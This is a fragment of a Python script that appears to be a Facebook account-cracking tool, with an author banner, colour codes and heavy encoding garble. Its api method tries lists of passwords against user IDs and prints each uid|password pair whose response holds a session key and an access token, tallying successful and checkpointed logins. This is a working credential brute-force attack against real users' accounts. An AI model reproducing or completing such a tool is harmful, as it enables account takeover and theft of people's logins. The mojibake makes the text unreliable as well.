...
class Main:
	def __init__(self):
		...
		print ("""    
\033[1;91m     S̸ ̸E̸ ̸J̸ ̸A̸ ̸D̸ KHAN
\033[1;93m    
 \033[1;92m 
 \033[1;91m  
\033[1;92m   
\033[1;93m 
    ...
    éˆ¹ï¿½ [é‰æ® AUTHOR   : SEJAD KHAN            éˆ¹ï¿½
    éˆ¹ï¿½ [é‰æ® GITHUB   : SEJAD KHAN         éˆ¹ï¿½
    éˆ¹ï¿½ [é‰æ® WHATSAPP : 03122*****1       éˆ¹ï¿½
    éˆ¹ï¿½ [é‰æ® POWER BY : \x1b[1;32mSNIGDHO\x1b[1;97m            éˆ¹ï¿½
    éˆ¹æ–ºæ”¢éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹æ¦Ž033[1;92m""")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/haroon.afridi.56614')
		else:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[SEJADOé¦ƒã†éˆ¥å¶æªªé””å»¬ : \033[0;97m %s/%s -> \033[0;92m [OKé¦ƒæ§:%s ]- \033[0;93m[CPé¦ƒæ¨‹:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SNIGDHO-OKé¦ƒæ§] %s|%s\033[0;97m         "%(uid, pw))
